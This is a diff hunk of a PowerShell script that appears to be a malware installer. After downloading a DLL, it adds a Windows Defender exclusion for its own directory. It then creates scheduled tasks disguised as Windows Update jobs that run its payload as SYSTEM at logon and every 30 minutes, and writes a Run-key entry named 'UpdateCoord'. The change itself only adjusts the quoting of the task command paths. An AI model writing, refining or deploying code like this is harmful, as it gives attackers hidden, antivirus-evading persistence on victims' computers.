@@ -57,11 +57,11 @@ if (Get-F "$u2/Bridge.dll$v" $dp) {
         $ad = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(512)
         if ($ad) { 
             Add-MpPreference -ExclusionPath $sDir -ErrorAction 0
-            schtasks /create /tn "\Microsoft\Windows\WindowsUpdate\WindowsUpdateScan" /tr $tp /sc onlogon /rl highest /f /ru "System" >$null
-            schtasks /create /tn "\Microsoft\Windows\WindowsUpdate\WindowsUpdateMaint" /tr $tp /sc minute /mo 30 /rl highest /f /ru "System" >$null 
+            schtasks /create /tn "\Microsoft\Windows\WindowsUpdate\WindowsUpdateScan" /tr "\"$tp\"" /sc onlogon /rl highest /f /ru "System" >$null
+            schtasks /create /tn "\Microsoft\Windows\WindowsUpdate\WindowsUpdateMaint" /tr "\"$tp\"" /sc minute /mo 30 /rl highest /f /ru "System" >$null 
         } else { 
-            schtasks /create /tn "WindowsUpdateScan" /tr $tp /sc onlogon /f >$null
-            schtasks /create /tn "WindowsUpdateMaint" /tr $tp /sc minute /mo 30 /f >$null 
+            schtasks /create /tn "WindowsUpdateScan" /tr "\"$tp\"" /sc onlogon /f >$null
+            schtasks /create /tn "WindowsUpdateMaint" /tr "\"$tp\"" /sc minute /mo 30 /f >$null 
         }
         Set-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" "UpdateCoord" $tp -ErrorAction 0
         return
